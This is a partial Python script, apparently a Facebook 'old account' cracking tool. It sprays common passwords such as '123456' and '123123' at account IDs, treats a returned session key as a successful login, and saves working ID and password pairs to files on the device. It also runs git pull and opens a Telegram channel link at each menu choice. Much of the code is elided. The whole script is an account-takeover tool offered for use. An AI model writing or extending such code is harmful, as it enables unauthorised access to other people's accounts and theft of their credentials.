...
os.system("git pull");os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
...
║ ║║  ║║  ║ ║║  ║  ║  ║ ║║║║║╣ 
╚═╝╩═╝╩╝  ╩ ╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝"""" ANONYMOUS"))
info=(f"""{style}{green} FACEBOOK {white}➤ {green}ANONYMOUS
{style}{green} STATUS   {white}➤ {green}{version}
{style}{green} TELEGRAM {white}➤ {green}https://t.me/AnonymousYourDad""")
def main_logo():
...
def main():
    ...
    if year_select in ['A','a','01','1']:os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");old_2011_2014()
    elif year_select in ['B','b','02','2']:os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://t.me/BD_MUSLIM_CYBER_ZONE");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_A:
                ...
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/ANONYMOUS-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/ANONYMOUS-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
